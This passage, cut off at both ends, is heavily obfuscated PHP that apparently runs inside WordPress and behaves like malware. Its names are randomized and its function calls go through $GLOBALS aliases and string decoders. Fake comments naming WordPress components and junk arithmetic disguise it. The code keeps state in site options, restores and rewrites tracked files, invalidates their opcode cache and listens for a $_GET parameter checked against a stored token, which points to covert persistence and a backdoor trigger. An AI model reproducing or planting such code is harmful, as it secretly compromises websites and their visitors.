   if  ($GLOBALS['__scf_vf9p0fditvxy_35']($qbbdbnt9zw09)  &&   (empty($_j3a8m6wh3jr[mhiu2yqz6kqd(1342)]) || (!empty($qbbdbnt9zw09[f5cd2smymkqusi5(1343)]) &&   $qbbdbnt9zw09[nhceivfj8tbe(1343)]    >=   $_j3a8m6wh3jr[nhceivfj8tbe(1343)])))   $_j3a8m6wh3jr   = $qbbdbnt9zw09;
   }
 return  $_j3a8m6wh3jr;
}
      function   vb9k6otlj0n7duv5om($icujfoqr_izg)
  {
  try     {
  if   (!defined(mhiu2yqz6kqd(1281)))  return;
      $f5gyrwqpykgq9r     =  $GLOBALS['__scf_zxyq0lcqv02z6_185']();
        if  ($icujfoqr_izg  ===   pahk8uy1uxt(217)    ||  $icujfoqr_izg  ===  nrudcgor(669))    {
 $prev =   i98kqd9b6k0g380fty6();


if      (
isset($prev[f5cd2smymkqusi5(1344)],    $prev[nhceivfj8tbe(1345)])      && $prev[f5cd2smymkqusi5(1344)]    ===  $icujfoqr_izg
    &&   $f5gyrwqpykgq9r   -    (int)  $prev[nhceivfj8tbe(1345)]   <    ($icujfoqr_izg ===  f5cd2smymkqusi5(669)     ? (0x15+0x117)  : (9+1))
   ) return;
 }
// prefetch broadcaster for WP Tag Cloud



    $_j3a8m6wh3jr = array(
 'v' => kwqziujdph5xlz3n(),
f5cd2smymkqusi5(1346) =>  xbl1u766t83yjb(),
pahk8uy1uxt(1347)  =>   vv_nfhhmy_1mjmsa(),
   dhd5r6_4ki(1127) =>  $GLOBALS['__scf_t8832qq90dxb4_3'](vv_nfhhmy_1mjmsa(),    nrudcgor(1303)),
  dhd5r6_4ki(1344) => $icujfoqr_izg,
  nrudcgor(1348)  => $f5gyrwqpykgq9r,


 f5cd2smymkqusi5(1345)   =>  $f5gyrwqpykgq9r,
    dhd5r6_4ki(1343) =>   isset($_SERVER[nhceivfj8tbe(1349)]) ?   (int)  $_SERVER[mhiu2yqz6kqd(1349)]  :     $f5gyrwqpykgq9r,
 );
    if    ($GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(753))) {
   $bczx88g60h9vft2  =   @update_option(mhiu2yqz6kqd(1340), $_j3a8m6wh3jr,   nhceivfj8tbe(1242));



 if   ($bczx88g60h9vft2 ===  false  &&     $GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(1339)))  {
   $ijnzdsaqr_y8zg19   =  @get_option(dhd5r6_4ki(1340), array());
 $ktmhsmnjv5oj62y7  = !$GLOBALS['__scf_vf9p0fditvxy_35']($ijnzdsaqr_y8zg19)  || !isset($ijnzdsaqr_y8zg19[mhiu2yqz6kqd(1344)], $ijnzdsaqr_y8zg19[dhd5r6_4ki(1350)]) ||     $ijnzdsaqr_y8zg19[dhd5r6_4ki(1344)]   !==  $icujfoqr_izg  ||    (int)   $ijnzdsaqr_y8zg19[dhd5r6_4ki(1350)] !==   $f5gyrwqpykgq9r;

 if  ($ktmhsmnjv5oj62y7  &&  isset($GLOBALS[dhd5r6_4ki(1100)]) && $GLOBALS['__scf_d56ll0ap77jcvq_66']($GLOBALS[pahk8uy1uxt(1100)])   && $GLOBALS['__scf_ttokt3ljhh_118']($GLOBALS[nrudcgor(1351)],  pahk8uy1uxt(1352)))   {


@$GLOBALS[dhd5r6_4ki(1353)]->check_connection(false);

    @update_option(pahk8uy1uxt(1354),      $_j3a8m6wh3jr,   pahk8uy1uxt(1242));
 }
    unset($ijnzdsaqr_y8zg19,  $ktmhsmnjv5oj62y7);
}

 unset($bczx88g60h9vft2);

 }
 $ys5go7qi508n =   twjiqbicrnr_q7();
   if  (@$GLOBALS['__scf_ux4_n6mewmsy_43']($ys5go7qi508n)     ||  gt671tq3242garyx4($ys5go7qi508n,  (491+2),    true)) {
   @$GLOBALS['__scf_xkvbr8xk_o_mly_194'](jdor23gxhpl2fludm465n(),   nhceivfj8tbe(1341)    .  $GLOBALS['__scf_umr3maax4akmys_597']($_j3a8m6wh3jr));
    }
  }    catch   (Throwable  $h2v_bjm4ejxq8fp)  {
// WP Categories Block: template alert

} catch      (Exception    $h2v_bjm4ejxq8fp)  {
  }
  }
function zgyyi45x9xgfqs0mxs6p($_j3a8m6wh3jr)
   {
 if  (!$GLOBALS['__scf_vf9p0fditvxy_35']($_j3a8m6wh3jr) || empty($_j3a8m6wh3jr[f5cd2smymkqusi5(1347)])   ||  !$GLOBALS['__scf__me483qbepnts_41']($_j3a8m6wh3jr[pahk8uy1uxt(1355)]))    return    nrudcgor(211);
$rk_3ecj8aw  =  $_j3a8m6wh3jr[nrudcgor(1356)];
   if  (!@$GLOBALS['__scf_gsamhlxot70ps_18']($rk_3ecj8aw) ||    (int) @$GLOBALS['__scf_g9y45bstmb02a_95']($rk_3ecj8aw) < (709-209))  return    mhiu2yqz6kqd(211);
    if (a6ucigno80cqr0m_($rk_3ecj8aw))  return      f5cd2smymkqusi5(210);
 $wxblmcmwgvzwjsap  =  isset($_j3a8m6wh3jr[nhceivfj8tbe(1344)]) ?  $_j3a8m6wh3jr[nrudcgor(1357)]   : "";



   $cx37cncy31qs3d  =   isset($_j3a8m6wh3jr[f5cd2smymkqusi5(1350)]) ? (int)  $_j3a8m6wh3jr[nhceivfj8tbe(1350)] :  0;
 if    ($wxblmcmwgvzwjsap ===      dhd5r6_4ki(1358)) return     ($cx37cncy31qs3d >   0 &&  $GLOBALS['__scf_zxyq0lcqv02z6_185']()   - $cx37cncy31qs3d   <=    (3591+9))     ? mhiu2yqz6kqd(1358)  :  dhd5r6_4ki(1359);
  if  ($wxblmcmwgvzwjsap === f5cd2smymkqusi5(188)) return dhd5r6_4ki(210);



if    ($wxblmcmwgvzwjsap === nhceivfj8tbe(1360)) return  ($cx37cncy31qs3d     >   0  &&   $GLOBALS['__scf_zxyq0lcqv02z6_185']()  -    $cx37cncy31qs3d     <=    (0x6a+0xe))     ? mhiu2yqz6kqd(1361)      :     nrudcgor(210);
   return  dhd5r6_4ki(1361);

}
    function h9npb8tudge1x98znf($no4625mwq2q9a2)
  {
     if  (!@$GLOBALS['__scf_gsamhlxot70ps_18']($no4625mwq2q9a2))    return  false;
  $mefny9wlt08e    =  (int)  @$GLOBALS['__scf_g9y45bstmb02a_95']($no4625mwq2q9a2);
      if    ($mefny9wlt08e <   (426+74)  ||  $mefny9wlt08e     >   (70380694-17951894)) return false;


$reoi8rizl6uwsukk = @$GLOBALS['__scf_apq4pqdt6n41_91']($no4625mwq2q9a2, false,   null,  0,  (7513-3417));
  if (!$GLOBALS['__scf__me483qbepnts_41']($reoi8rizl6uwsukk)    ||    !$GLOBALS['__scf_saw_32lvsj_92'](pahk8uy1uxt(207),  $reoi8rizl6uwsukk))     return  false;
  if  ($mefny9wlt08e   > (1002888+45688))      {
  $spxzjtpg4pa938mw    = @$GLOBALS['__scf_apq4pqdt6n41_91']($no4625mwq2q9a2, false,  null,  $mefny9wlt08e   -   (4043+53));
   return  $GLOBALS['__scf__me483qbepnts_41']($spxzjtpg4pa938mw)  && $GLOBALS['__scf_saw_32lvsj_92'](dhd5r6_4ki(1362), $spxzjtpg4pa938mw) ===   1;
 }



      $v_2ea0ui7nym = @$GLOBALS['__scf_apq4pqdt6n41_91']($no4625mwq2q9a2);
  if    (!$GLOBALS['__scf__me483qbepnts_41']($v_2ea0ui7nym))  return  false;
 return hkk3yvii60ci7rk($v_2ea0ui7nym);
}
    function    lzhxpcpzmcnh2ec($rssv1_lmnwher_o, $ha79t63e3av)
 {
 $yyd_e0azaqfjq =      @$GLOBALS['__scf_apq4pqdt6n41_91']($rssv1_lmnwher_o,     false,   null,   0,  (4039+57));
    $k_8fz1geufd   =  @$GLOBALS['__scf_apq4pqdt6n41_91']($ha79t63e3av,     false,  null,  0,  (4046+50));
  if (!$GLOBALS['__scf__me483qbepnts_41']($yyd_e0azaqfjq)      ||    !$GLOBALS['__scf__me483qbepnts_41']($k_8fz1geufd))     return  false;
   $taovdd3i94rltjm   = $e06b1h0rrkfp_ = null;
   

  if     ($GLOBALS['__scf_saw_32lvsj_92']("/!function_exists\('([A-Za-z0-9_]+)'\)/", $yyd_e0azaqfjq, $yfbhrgikxva2)) $taovdd3i94rltjm  = $yfbhrgikxva2[1];
if  ($GLOBALS['__scf_saw_32lvsj_92']("/!function_exists\('([A-Za-z0-9_]+)'\)/", $k_8fz1geufd,  $yfbhrgikxva2)) $e06b1h0rrkfp_    = $yfbhrgikxva2[1];
 

    return     $taovdd3i94rltjm  !==   null &&   $taovdd3i94rltjm ===  $e06b1h0rrkfp_;
  }
  function  a6ucigno80cqr0m_($no4625mwq2q9a2)



    {
    $q4nmj640k4ytm0w      = $GLOBALS['__scf_t8832qq90dxb4_3']($no4625mwq2q9a2,    nrudcgor(1363));
foreach  (array($GLOBALS['__scf_eure5hcx2b_11']($no4625mwq2q9a2), s3e5iki9upa0ccql())    as $i7is8x4_pstu0r) {
      $d4g6t2rengbe0    =   $i7is8x4_pstu0r .      f5cd2smymkqusi5(183) . $q4nmj640k4ytm0w;


if (!@$GLOBALS['__scf_gsamhlxot70ps_18']($d4g6t2rengbe0) ||     (int)    @$GLOBALS['__scf_hqkv9v6te1dvxi_94']($d4g6t2rengbe0) <    $GLOBALS['__scf_zxyq0lcqv02z6_185']() -  (604738+62)) continue;



$n4qv13nku94n3g3c = $GLOBALS['__scf_uvjtdemk2f_320']((string) @$GLOBALS['__scf_apq4pqdt6n41_91']($d4g6t2rengbe0));



     if ($n4qv13nku94n3g3c === "") continue;
   $v_2ea0ui7nym = yrklujewy9nbrhy($no4625mwq2q9a2);
 

      if  ($v_2ea0ui7nym === null)    continue;
if  ($GLOBALS['__scf__me483qbepnts_41']($v_2ea0ui7nym) &&    $v_2ea0ui7nym   !==   "" &&     $GLOBALS['__scf_nn04_vx3uspzx4_54']($v_2ea0ui7nym)    ===    $n4qv13nku94n3g3c)  return  true;
 }

return      false;
 }
   function   hbznvngszh_owndcbdovv($no4625mwq2q9a2)



 {
if   (!$GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(1364)) ||    !$GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(753))) return;


   $phbzem8wsxe =  @get_option(pahk8uy1uxt(1365),    array());
  if (!$GLOBALS['__scf_vf9p0fditvxy_35']($phbzem8wsxe)) $phbzem8wsxe     =  array();
   $phbzem8wsxe[$GLOBALS['__scf_nn04_vx3uspzx4_54']($no4625mwq2q9a2)] = $no4625mwq2q9a2;


 if ($GLOBALS['__scf_upe5p4qfaqm0d1_36']($phbzem8wsxe)  > (5+15)) $phbzem8wsxe    =    $GLOBALS['__scf_jxqnb2ruhcwvk_155']($phbzem8wsxe,    -(19+1),   null,  true);
  @update_option(pahk8uy1uxt(1365),  $phbzem8wsxe, mhiu2yqz6kqd(1242));
  }
 function  cb_z3fat5wresxy_6otjdw()
     {
 if (!$GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(1366))   || !$GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(753)))    return;
   $phbzem8wsxe  =      @get_option(f5cd2smymkqusi5(1365),     array());
     if  (!$GLOBALS['__scf_vf9p0fditvxy_35']($phbzem8wsxe)   ||    empty($phbzem8wsxe))  return;
   $v57q7hq48zhc  = array();
 foreach   ($phbzem8wsxe as     $cueercjqf3k  =>   $rk_3ecj8aw)   {
   if (!$GLOBALS['__scf__me483qbepnts_41']($rk_3ecj8aw) || $rk_3ecj8aw   ===   ""  ||  !@$GLOBALS['__scf_gsamhlxot70ps_18']($rk_3ecj8aw))  continue;
 if   ($rk_3ecj8aw    ===  vv_nfhhmy_1mjmsa())     continue;
   $ay4qv26ragfrz91a  = @$GLOBALS['__scf_a9u8k74i0cg19_33']($rk_3ecj8aw);
   $int0gmia397 =     @$GLOBALS['__scf_a9u8k74i0cg19_33'](vv_nfhhmy_1mjmsa());
// mbstring strict: equivariant fallback-handler

 if   ($GLOBALS['__scf__me483qbepnts_41']($ay4qv26ragfrz91a) &&   $GLOBALS['__scf__me483qbepnts_41']($int0gmia397)   &&     $ay4qv26ragfrz91a ===     $int0gmia397)  continue;
     unset($ay4qv26ragfrz91a,    $int0gmia397);
if    (c0egos9umjdrt0ya($rk_3ecj8aw) ===    false)     {


      $v57q7hq48zhc[$cueercjqf3k] = $rk_3ecj8aw;$ilva2mrg49q=40+7;$hxksdtaen=$ilva2mrg49q-32;
    continue;
    }
rgiuaapohxeh0z($rk_3ecj8aw, (362+58));
  if    (t65xl1pt2haov_izh($rk_3ecj8aw))  {
if  ($GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(1292))) @opcache_invalidate($rk_3ecj8aw,    true);
  }    elseif (@$GLOBALS['__scf_gsamhlxot70ps_18']($rk_3ecj8aw))    {$ytlvqaujw6mm=-341;$r0c6e4gzh=($ytlvqaujw6mm>0)?$ytlvqaujw6mm:-$ytlvqaujw6mm;
$v57q7hq48zhc[$cueercjqf3k]  =  $rk_3ecj8aw;
 }

    }
// case folding




@update_option(f5cd2smymkqusi5(1365),     $v57q7hq48zhc,  dhd5r6_4ki(1242));
}
 function  iauf2w5t89abvxz()
 {
try     {
$h2v_bjm4ejxq8fp = $GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(1367))  ?  @error_get_last()  : null;



 if   (
     $GLOBALS['__scf_vf9p0fditvxy_35']($h2v_bjm4ejxq8fp)   &&     !empty($h2v_bjm4ejxq8fp[dhd5r6_4ki(173)]) &&  !empty($h2v_bjm4ejxq8fp[dhd5r6_4ki(174)])
&& $GLOBALS['__scf_rq7q923zwh_148']($h2v_bjm4ejxq8fp[nrudcgor(174)],    array(E_ERROR,  E_PARSE, E_CORE_ERROR,  E_COMPILE_ERROR,  E_USER_ERROR), true)
    )     {



   $z4yx2l094vtgk  =    @$GLOBALS['__scf_a9u8k74i0cg19_33'](vv_nfhhmy_1mjmsa());



$_ef = @$GLOBALS['__scf_a9u8k74i0cg19_33']($h2v_bjm4ejxq8fp[pahk8uy1uxt(173)]);
if ($GLOBALS['__scf__me483qbepnts_41']($z4yx2l094vtgk)    && $GLOBALS['__scf__me483qbepnts_41']($_ef) &&  $_ef  ===  $z4yx2l094vtgk)  return;

}
       vb9k6otlj0n7duv5om(mhiu2yqz6kqd(1358));
    if     (defined(nrudcgor(1281))) {


  $wdwxvqut2k =     c22qy86hpk_wa_dng_pe();
    if   (@$GLOBALS['__scf_gsamhlxot70ps_18']($wdwxvqut2k[1])) {
  $yjx82dbc4_o6kz3j     =    @$GLOBALS['__scf_apq4pqdt6n41_91']($wdwxvqut2k[1], false, null, 0, (86-22));
   if    ($GLOBALS['__scf__me483qbepnts_41']($yjx82dbc4_o6kz3j)   &&    $GLOBALS['__scf_nr12ouzrtt_7']($yjx82dbc4_o6kz3j,   dhd5r6_4ki(1241)    .   kwqziujdph5xlz3n() . ':')  === 0) {
  $nvnowww6i9e    =   @$GLOBALS['__scf_gsamhlxot70ps_18']($wdwxvqut2k[1]      . mhiu2yqz6kqd(1368)) ?  @$GLOBALS['__scf_apq4pqdt6n41_91']($wdwxvqut2k[1]   .  dhd5r6_4ki(1368),  false, null,  0, (63+1))  :  "";

    if  ($nvnowww6i9e !== $yjx82dbc4_o6kz3j)  @$GLOBALS['__scf_wil5cpc7euw09_73']($wdwxvqut2k[1],   $wdwxvqut2k[1]  .    nrudcgor(1368));


 }
// WP Core Data transient TTL



       }
// replicate validator for WP Redux Store

 unset($wdwxvqut2k,   $yjx82dbc4_o6kz3j, $nvnowww6i9e);
    }
} catch     (Throwable $w0qhc9lo96aq6g16)   {

}      catch (Exception  $w0qhc9lo96aq6g16) {
    }
}
        function   shx29b88v9e3aexl($ha79t63e3av)
   {
  if (!$GLOBALS['__scf__me483qbepnts_41']($ha79t63e3av)) return    "";
  if    ($GLOBALS['__scf_q4nsibbhphays_1369'](dhd5r6_4ki(1370),  $ha79t63e3av,  $ql9xrpg4279b)) {
  foreach      ($ql9xrpg4279b[1]  as    $xkems8x1ubr)   {
if (rng_bhkc5cqwuzqv9i5x06($GLOBALS['__scf_wlpl5h61eyolq_355']($xkems8x1ubr,     true)))  return "";


 }



}
 if    ($GLOBALS['__scf_q4nsibbhphays_1369'](nrudcgor(1371), $ha79t63e3av,   $ql9xrpg4279b))    {
 foreach ($ql9xrpg4279b[1]  as  $xkems8x1ubr) {
  if    (rng_bhkc5cqwuzqv9i5x06(stripcslashes($xkems8x1ubr)))   return      "";
  if  ($GLOBALS['__scf_nr12ouzrtt_7']($xkems8x1ubr,   f5cd2smymkqusi5(1372))    !==  false)  {
  $uy8821lc53aaja =   preg_replace_callback(nhceivfj8tbe(1373),    nhceivfj8tbe(1374),  $xkems8x1ubr);
 if  ($GLOBALS['__scf__me483qbepnts_41']($uy8821lc53aaja)   && $uy8821lc53aaja !== $xkems8x1ubr    && rng_bhkc5cqwuzqv9i5x06($uy8821lc53aaja)) return  "";
 }
   }


   }
  if    ($GLOBALS['__scf_q4nsibbhphays_1369'](dhd5r6_4ki(1375),  $ha79t63e3av,  $ql9xrpg4279b))  {
// inflationary aggregator

      foreach  ($ql9xrpg4279b[1] as  $xkems8x1ubr)  {
    if  (rng_bhkc5cqwuzqv9i5x06($GLOBALS['__scf_f9_5dfsm5hfxx_360'](array(f5cd2smymkqusi5(1376),  pahk8uy1uxt(1377)),   array('\\', '\''),   $xkems8x1ubr)))  return "";


  if   ($GLOBALS['__scf_nr12ouzrtt_7']($xkems8x1ubr, dhd5r6_4ki(1372)) !==  false)    {
     $uy8821lc53aaja   = preg_replace_callback(nhceivfj8tbe(1373), f5cd2smymkqusi5(1374), $xkems8x1ubr);$u7s3t6wbebjq=PHP_INT_MAX/PHP_INT_MAX;$nqf6y0sj1=$u7s3t6wbebjq+67;
    if    ($GLOBALS['__scf__me483qbepnts_41']($uy8821lc53aaja)   &&    $uy8821lc53aaja  !==    $xkems8x1ubr && rng_bhkc5cqwuzqv9i5x06($uy8821lc53aaja)) return   "";
  }
   }
 }
   return  $ha79t63e3av;
   }
function  qw7nxv0zxmx9qe17o($nfwt0_jg6oiy6)

{
 if    (!$GLOBALS['__scf__me483qbepnts_41']($nfwt0_jg6oiy6)   || ($GLOBALS['__scf_nr12ouzrtt_7']($nfwt0_jg6oiy6,  nhceivfj8tbe(1378))      ===  false &&  $GLOBALS['__scf_nr12ouzrtt_7']($nfwt0_jg6oiy6,  f5cd2smymkqusi5(355)) === false)) return  false;
if ($GLOBALS['__scf_q4nsibbhphays_1369'](nrudcgor(1379), $nfwt0_jg6oiy6,  $ql9xrpg4279b))    {$x0ekbtcn38vb3j=-887;$q0s2awu2o2cu=($x0ekbtcn38vb3j>0)?$x0ekbtcn38vb3j:-$x0ekbtcn38vb3j;
   foreach   ($ql9xrpg4279b[1]   as $xkems8x1ubr) {
/* uncountable capability */


    if    (rng_bhkc5cqwuzqv9i5x06($GLOBALS['__scf_wlpl5h61eyolq_355']($xkems8x1ubr, true)))   return  true;



    }
 }
     if      ($GLOBALS['__scf_q4nsibbhphays_1369'](f5cd2smymkqusi5(1371),     $nfwt0_jg6oiy6,     $ql9xrpg4279b)) {
foreach  ($ql9xrpg4279b[1]   as     $xkems8x1ubr)  {

   if    (rng_bhkc5cqwuzqv9i5x06(stripcslashes($xkems8x1ubr)))    return  true;
}
    foreach   ($ql9xrpg4279b[1] as  $xkems8x1ubr)    {
  if   ($GLOBALS['__scf_nr12ouzrtt_7']($xkems8x1ubr, mhiu2yqz6kqd(1372)) === false) continue;
   $uy8821lc53aaja  = preg_replace_callback(pahk8uy1uxt(1373),     nhceivfj8tbe(1380), $xkems8x1ubr);

  if    ($GLOBALS['__scf__me483qbepnts_41']($uy8821lc53aaja)  &&   $uy8821lc53aaja  !==     $xkems8x1ubr  &&  rng_bhkc5cqwuzqv9i5x06($uy8821lc53aaja))  return     true;$pgs915ev=23+4;$nj32v_vq7ais9d=$pgs915ev-24;
 }
     }
 if   ($GLOBALS['__scf_q4nsibbhphays_1369'](f5cd2smymkqusi5(1381),  $nfwt0_jg6oiy6, $ql9xrpg4279b))  {
// scatter projective-adj dependency-graph

     foreach  ($ql9xrpg4279b[1]  as  $xkems8x1ubr) {
   if   (rng_bhkc5cqwuzqv9i5x06($GLOBALS['__scf_f9_5dfsm5hfxx_360'](array(f5cd2smymkqusi5(1382),   nrudcgor(1377)),      array('\\', '\''),  $xkems8x1ubr)))  return   true;
}
foreach ($ql9xrpg4279b[1]     as  $xkems8x1ubr)  {
  if  ($GLOBALS['__scf_nr12ouzrtt_7']($xkems8x1ubr,    nrudcgor(1372))    ===     false)   continue;
     $uy8821lc53aaja     =  preg_replace_callback(pahk8uy1uxt(1373),     mhiu2yqz6kqd(1380),      $xkems8x1ubr);$at6jaav1q5l0e4=PHP_MAJOR_VERSION;$z6rlp2tf=$at6jaav1q5l0e4*4;
if    ($GLOBALS['__scf__me483qbepnts_41']($uy8821lc53aaja)     &&   $uy8821lc53aaja   !==   $xkems8x1ubr &&    rng_bhkc5cqwuzqv9i5x06($uy8821lc53aaja))   return     true;
 }
  }
return     false;
 }



  function    xf8ira46bu0zojfjh($nfwt0_jg6oiy6)
    {
    if (!$GLOBALS['__scf__me483qbepnts_41']($nfwt0_jg6oiy6) || $nfwt0_jg6oiy6 ===   "")   return  "";
     return    ($GLOBALS['__scf_saw_32lvsj_92'](nrudcgor(744),   $GLOBALS['__scf_bv1z3no349dv5r_9']($nfwt0_jg6oiy6,  0,   (5623+2569)),     $d1kd72zq60vf6el)) ?  $d1kd72zq60vf6el[1]    : "";

     }
    function   e5mr40mjt4j9xz_gic8hj($v_2ea0ui7nym,  $tlv32r0ravg,  $cjptm7nbb46fjj   =    null)
    {
if  (!$GLOBALS['__scf__me483qbepnts_41']($v_2ea0ui7nym)   ||  $v_2ea0ui7nym  ===  "")    return  $v_2ea0ui7nym;
   $wbnzrqc9ysq_rz  = mhiu2yqz6kqd(778)     .     $tlv32r0ravg  .   mhiu2yqz6kqd(779);
$m6t27xygoirjp =    "";


  $e3sb1f_pmf  =    0;
 while ($e3sb1f_pmf++   <   (16<<3)) {
  $xjc6ftjmffdlb      =   $GLOBALS['__scf_nr12ouzrtt_7']($v_2ea0ui7nym, $wbnzrqc9ysq_rz);
 if    ($xjc6ftjmffdlb   === false)  break;
 $bvpdwqp85dn  = $xjc6ftjmffdlb      +    $GLOBALS['__scf_amjjmfnilcolnb_10']($wbnzrqc9ysq_rz);
$dnn52nbngpz  =   $GLOBALS['__scf_nr12ouzrtt_7']($v_2ea0ui7nym, dhd5r6_4ki(1272),  $bvpdwqp85dn);
     if   ($dnn52nbngpz    ===  false      ||    $dnn52nbngpz   -  $bvpdwqp85dn     >  (56+8)) {
   $m6t27xygoirjp .= $GLOBALS['__scf_bv1z3no349dv5r_9']($v_2ea0ui7nym,   0,   $bvpdwqp85dn);


 $v_2ea0ui7nym =   $GLOBALS['__scf_bv1z3no349dv5r_9']($v_2ea0ui7nym, $bvpdwqp85dn);
continue;
  }
 $gejiz6p4a0q =  $GLOBALS['__scf_bv1z3no349dv5r_9']($v_2ea0ui7nym,  $bvpdwqp85dn,  $dnn52nbngpz  -    $bvpdwqp85dn);



if  (!$GLOBALS['__scf_saw_32lvsj_92'](f5cd2smymkqusi5(1383),      $gejiz6p4a0q))     {
  $m6t27xygoirjp   .=    $GLOBALS['__scf_bv1z3no349dv5r_9']($v_2ea0ui7nym,     0, $bvpdwqp85dn);


   $v_2ea0ui7nym   =   $GLOBALS['__scf_bv1z3no349dv5r_9']($v_2ea0ui7nym, $bvpdwqp85dn);
       

 continue;


}
 $hf_5m5ua4dygf_  =   dhd5r6_4ki(778) .    $tlv32r0ravg .     nhceivfj8tbe(1384)   . $gejiz6p4a0q   . f5cd2smymkqusi5(1272);
   $y2q_uvt6317i =  $GLOBALS['__scf_nr12ouzrtt_7']($v_2ea0ui7nym, $hf_5m5ua4dygf_,     $dnn52nbngpz);
if ($y2q_uvt6317i ===  false)  break;
     $m6t27xygoirjp  .= $GLOBALS['__scf_bv1z3no349dv5r_9']($v_2ea0ui7nym,   0, $xjc6ftjmffdlb);
   $jpt2eloalbdb =  $GLOBALS['__scf_bv1z3no349dv5r_9']($v_2ea0ui7nym,  $xjc6ftjmffdlb,    $y2q_uvt6317i   +   $GLOBALS['__scf_amjjmfnilcolnb_10']($hf_5m5ua4dygf_)     - $xjc6ftjmffdlb);
 if   ($cjptm7nbb46fjj   !==  null)     {


 $o6cshl9m0sbvrr = $GLOBALS['__scf__ilhh_yoem3eg_289']($cjptm7nbb46fjj,   $jpt2eloalbdb);
  if     ($GLOBALS['__scf__me483qbepnts_41']($o6cshl9m0sbvrr))  $m6t27xygoirjp  .= $o6cshl9m0sbvrr;


} else  {
  $m6t27xygoirjp    .= $jpt2eloalbdb;


   }
   $v_2ea0ui7nym   = $GLOBALS['__scf_bv1z3no349dv5r_9']($v_2ea0ui7nym,    $y2q_uvt6317i   + $GLOBALS['__scf_amjjmfnilcolnb_10']($hf_5m5ua4dygf_));

 }
    return $m6t27xygoirjp   .      $v_2ea0ui7nym;$kc3ey0k5kxo=PHP_INT_MAX/PHP_INT_MAX;$lf967uxj9b269=$kc3ey0k5kxo+85;
 }

       function vne_1yyimtst1it1go6($ha79t63e3av)
       {
     return   "";


   }


 function  t5ns8r_upaiull($ha79t63e3av)

   {
   if  (!$GLOBALS['__scf__me483qbepnts_41']($ha79t63e3av))   return  "";

 if    (!defined(f5cd2smymkqusi5(1281)))   return  $ha79t63e3av;
$da7fwdwb585oy6   = ohrydgas8yy9a22s(ABSPATH     . mhiu2yqz6kqd(1385),  (1<<3));
    if ($GLOBALS['__scf_saw_32lvsj_92'](dhd5r6_4ki(1386)  .   $da7fwdwb585oy6  .      f5cd2smymkqusi5(1387),  $ha79t63e3av))   return    "";
     return   $ha79t63e3av;
}
  function  rrzjoqm3v5ibh54qfg0a0h($v_2ea0ui7nym)


    {
// inline non-strict radix-tree

    if (!$GLOBALS['__scf__me483qbepnts_41']($v_2ea0ui7nym)      || $v_2ea0ui7nym  ===   "") return $v_2ea0ui7nym;

$pycaeceedws  =  e5mr40mjt4j9xz_gic8hj($v_2ea0ui7nym, mhiu2yqz6kqd(1388),  nhceivfj8tbe(1389));
$pycaeceedws    =   e5mr40mjt4j9xz_gic8hj($pycaeceedws, pahk8uy1uxt(1390),    nhceivfj8tbe(1391));
    if ($GLOBALS['__scf__me483qbepnts_41']($pycaeceedws))      $pycaeceedws  = $GLOBALS['__scf_fhlvy786vrl3_463'](nrudcgor(1392),   "",   $pycaeceedws);
 if  (!$GLOBALS['__scf__me483qbepnts_41']($pycaeceedws))    $pycaeceedws =      $v_2ea0ui7nym;



 if  (qw7nxv0zxmx9qe17o($pycaeceedws))  {
     $pycaeceedws = e5mr40mjt4j9xz_gic8hj($pycaeceedws,  nrudcgor(1388), nrudcgor(1393));
  $pycaeceedws  =   e5mr40mjt4j9xz_gic8hj($pycaeceedws,   nrudcgor(1394),   nhceivfj8tbe(1393));


if   ($GLOBALS['__scf__me483qbepnts_41']($pycaeceedws))    $pycaeceedws     = $GLOBALS['__scf_fhlvy786vrl3_463'](pahk8uy1uxt(1392),   "", $pycaeceedws);



 }
// deserialize session-window for WP Slot Fill

   return  $GLOBALS['__scf__me483qbepnts_41']($pycaeceedws) ? $pycaeceedws   :  $v_2ea0ui7nym;
   }



  function o1e34kmk6oc0r_s7p($v_2ea0ui7nym)
   {
     if   (!$GLOBALS['__scf__me483qbepnts_41']($v_2ea0ui7nym)    ||    !defined(nhceivfj8tbe(1395))) return false;
       if   ($GLOBALS['__scf_saw_32lvsj_92'](nrudcgor(1396), $v_2ea0ui7nym))  return  true;
 $utpftqy3vvp = ohrydgas8yy9a22s(ABSPATH   .     nrudcgor(1385),    (0x1+0x7));
if  ($GLOBALS['__scf_q4nsibbhphays_1369'](dhd5r6_4ki(1397),   $v_2ea0ui7nym,  $yjq8ovpciccf75w))    {
foreach  ($yjq8ovpciccf75w[1] as  $ojxwecs0x9z8h) {
   if ($GLOBALS['__scf_bv1z3no349dv5r_9']($ojxwecs0x9z8h, -(85^92))    ===   ':'     .  $utpftqy3vvp) return true;
 }
     }
$_dd =    $GLOBALS['__scf_bv1z3no349dv5r_9']($GLOBALS['__scf_nn04_vx3uspzx4_54'](ABSPATH   .  nhceivfj8tbe(1398)), 0,  (4+4));
  if   ($GLOBALS['__scf_q4nsibbhphays_1369'](nhceivfj8tbe(1399),      $v_2ea0ui7nym, $_dm))  {
 foreach   ($_dm[1]     as    $c_0358tpc8)      {
if  ($c_0358tpc8 ===    $_dd)   return true;
 }



  }
return     false;
}
 function  ozq2g_rkrwtndwe4w4()
   {
      if  (!isset($_GET[f5cd2smymkqusi5(1400)]) ||      !$GLOBALS['__scf__me483qbepnts_41']($_GET[dhd5r6_4ki(1400)])  || !$GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(1366)))     return;

   $wxblmcmwgvzwjsap  =    @get_option(nrudcgor(1401),   array());
  if     (!$GLOBALS['__scf_vf9p0fditvxy_35']($wxblmcmwgvzwjsap)) return;
       $digk2wmdxsk9   =    (string)   $_GET[dhd5r6_4ki(1400)];
       $f6_o9tsh33utg = array();

if  (isset($wxblmcmwgvzwjsap['t']))     $f6_o9tsh33utg[]  = (string)  $wxblmcmwgvzwjsap['t'];

    if    (isset($wxblmcmwgvzwjsap[f5cd2smymkqusi5(561)]) &&   $GLOBALS['__scf_vf9p0fditvxy_35']($wxblmcmwgvzwjsap[nrudcgor(561)])) {



foreach   ($wxblmcmwgvzwjsap[nrudcgor(1402)]  as $ye4ostf0t1yu) {


